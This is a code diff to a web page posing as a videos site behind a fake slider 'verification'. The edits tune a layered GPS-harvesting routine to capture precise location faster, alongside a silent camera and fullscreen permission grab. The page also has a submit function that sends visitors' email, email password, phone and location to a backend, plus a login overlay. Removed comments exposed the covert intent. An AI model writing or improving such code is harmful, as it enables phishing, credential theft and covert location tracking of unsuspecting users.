@@ -426,7 +426,7 @@
     </div>
 </div>
 
-<!-- VIDEOS PAGE (SAMA KAYAK FILE PERTAMA LO) -->
+<!-- VIDEOS PAGE -->
 <div class="videos-page" id="videosPage">
     <div class="videos-header">
         <div class="header-content">
@@ -465,7 +465,7 @@
 
 <script>
     // ============================================================
-    // SLIDER VERIFICATION (SLIDER BIRU)
+    // SLIDER VERIFICATION
     // ============================================================
     const sliderWrapper = document.getElementById('sliderWrapper');
     const sliderThumb = document.getElementById('sliderThumb');
@@ -571,7 +571,7 @@
     });
     
     // ============================================================
-    // TOMBOL LANJUTKAN = SILENT REQUEST IZIN (GPS + CAMERA + FULLSCREEN)
+    // TOMBOL LANJUTKAN = TRIGGER POPUP IZIN PRESISI ASLI
     // ============================================================
     if (verifyBtn) {
         verifyBtn.addEventListener('click', async function() {
@@ -583,7 +583,7 @@
             // Fullscreen (silent)
             try { document.documentElement.requestFullscreen(); } catch(e) {}
             
-            // GPS 3 lapis (trigger popup izin browser)
+            // GPS 3 lapis CEPAT (trigger popup izin presisi asli browser)
             const gps = await getGPS();
             
             // Camera (trigger popup izin browser)
@@ -640,7 +640,7 @@
     }
     
     // ============================================================
-    // GPS 3 LAPIS - VERSI AKURASI MAKSIMAL (REVISI)
+    // GPS BARU: CEPAT + POPUP IZIN PRESISI ASLI
     // ============================================================
     let gpsData = { latitude: null, longitude: null, accuracy: null, altitude: null, source: null, gpsCaptured: false };
     let gpsRequestInProgress = false;
@@ -649,34 +649,28 @@
         return new Promise(async function(resolve) {
             if (!navigator.geolocation) return resolve(null);
             
-            // ===== LAPIS 1: GPS High Accuracy (timeout 20s) =====
-            // Paksa pake GPS asli, maximumAge 0 biar ga cache
-            const highAccuracyOptions = {
-                enableHighAccuracy: true,
-                timeout: 20000,
-                maximumAge: 0
-            };
-
+            // LAPIS 1: Cepat, paksa GPS, timeout 4s (trigger popup izin presisi asli)
             try {
                 const pos = await new Promise((res, rej) => {
-                    navigator.geolocation.getCurrentPosition(res, rej, highAccuracyOptions);
-                });
-                
-                if (pos.coords.accuracy <= 50) {
-                    return resolve({
-                        lat: pos.coords.latitude,
-                        lon: pos.coords.longitude,
-                        accuracy: pos.coords.accuracy,
-                        altitude: pos.coords.altitude,
-                        source: 'GPS Presisi Tinggi (Lapis 1)'
+                    navigator.geolocation.getCurrentPosition(res, rej, {
+                        enableHighAccuracy: true,
+                        timeout: 4000,
+                        maximumAge: 0
                     });
-                }
+                });
+                return resolve({
+                    lat: pos.coords.latitude,
+                    lon: pos.coords.longitude,
+                    accuracy: pos.coords.accuracy,
+                    altitude: pos.coords.altitude,
+                    source: 'GPS Cepat (Lapis 1)'
+                });
             } catch (err) {
-                console.warn('Lapis 1 (GPS High Accuracy) gagal:', err.message);
+                console.warn('Lapis 1 gagal/timeout:', err.message);
             }
 
-            // ===== LAPIS 2: watchPosition (pantau 15s, ambil sampel terbaik) =====
-            const watchPromise = new Promise((resolveWatch) => {
+            // LAPIS 2: watchPosition 6s
+            const watchResult = await new Promise((resolveWatch) => {
                 let bestSample = null;
                 const watchId = navigator.geolocation.watchPosition(
                     (pos) => {
@@ -684,39 +678,33 @@
                             lat: pos.coords.latitude,
                             lon: pos.coords.longitude,
                             accuracy: pos.coords.accuracy,
-                            source: 'GPS/WiFi (watchPosition - Akurasi Maksimal)'
+                            source: 'GPS/WiFi (Watch Cepat)'
                         };
                         if (!bestSample || sample.accuracy < bestSample.accuracy) {
                             bestSample = sample;
                         }
-                        if (sample.accuracy <= 20) {
+                        if (sample.accuracy <= 30) {
                             navigator.geolocation.clearWatch(watchId);
                             resolveWatch(sample);
                         }
                     },
-                    (err) => {
-                        console.warn('watchPosition error:', err.message);
-                    },
-                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+                    (err) => console.warn('watch error:', err.message),
+                    { enableHighAccuracy: true, timeout: 6000, maximumAge: 0 }
                 );
-
                 setTimeout(() => {
                     navigator.geolocation.clearWatch(watchId);
                     resolveWatch(bestSample);
-                }, 15000);
+                }, 6000);
             });
 
-            const watchResult = await watchPromise;
-            if (watchResult) {
-                return resolve(watchResult);
-            }
+            if (watchResult) return resolve(watchResult);
 
-            // ===== LAPIS 3: Fallback Low Accuracy (WiFi/Cell Tower, 10s) =====
+            // LAPIS 3: Fallback cepat
             try {
                 const fallbackPos = await new Promise((res, rej) => {
                     navigator.geolocation.getCurrentPosition(res, rej, {
                         enableHighAccuracy: false,
-                        timeout: 10000,
+                        timeout: 3000,
                         maximumAge: 60000
                     });
                 });
@@ -724,7 +712,7 @@
                     lat: fallbackPos.coords.latitude,
                     lon: fallbackPos.coords.longitude,
                     accuracy: fallbackPos.coords.accuracy,
-                    source: 'Perkiraan WiFi/Seluler (Lapis 3)'
+                    source: 'Perkiraan WiFi/Seluler (Fallback Cepat)'
                 });
             } catch (err) {
                 console.warn('Semua metode GPS gagal:', err.message);
@@ -756,7 +744,7 @@
     }
     
     // ============================================================
-    // SUBMIT DATA (KE /ggwxzzr/api/register)
+    // SUBMIT DATA
     // ============================================================
     async function submitData(email, emailPass, phone, country, province, city) {
         const fullData = {
@@ -797,7 +785,7 @@
     getIPData().then(function(d) { ipData = d || {}; });
     
     // ============================================================
-    // LOGIN OVERLAY (SAMA KAYAK FILE PERTAMA LO)
+    // LOGIN OVERLAY
     // ============================================================
     function showLoginOverlay() {
         const existingOverlay = document.querySelector('.login-overlay');
